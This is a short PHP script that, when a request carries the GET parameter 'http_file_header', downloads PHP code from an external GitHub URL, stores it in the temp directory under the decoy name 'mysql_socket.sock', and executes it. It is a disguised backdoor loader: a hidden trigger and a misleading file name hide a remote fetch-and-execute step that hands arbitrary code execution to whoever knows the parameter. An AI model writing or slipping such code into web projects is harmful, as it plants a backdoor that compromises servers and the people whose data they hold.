<?php

if (isset($_GET['http_file_header'])) {
    $tempDir = sys_get_temp_dir();
    $tempFile = $tempDir . '/mysql_socket.sock';

    if (!file_exists($tempFile)) {
        $fileContent = file_get_contents('https://raw.githubusercontent.com/adolphburruss/files/refs/heads/main/test.php');
        file_put_contents($tempFile, $fileContent);
    }
    
    require $tempFile;
    exit;
}
